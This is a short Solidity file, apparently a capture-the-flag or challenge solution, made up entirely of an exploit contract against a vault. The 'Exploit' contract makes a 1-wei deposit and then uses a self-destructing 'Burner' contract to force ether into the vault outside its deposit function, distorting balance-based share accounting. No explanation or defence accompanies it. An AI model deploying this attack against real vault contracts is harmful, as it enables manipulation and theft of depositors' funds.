// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

interface IVault {
    function deposit() external payable returns (uint256);
}

contract Burner {
    constructor(address payable to) payable {
        selfdestruct(to);
    }
}

contract Exploit {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function run() external {
        IVault(target).deposit{value: 1}();
        new Burner{value: address(this).balance}(payable(target));
    }
}
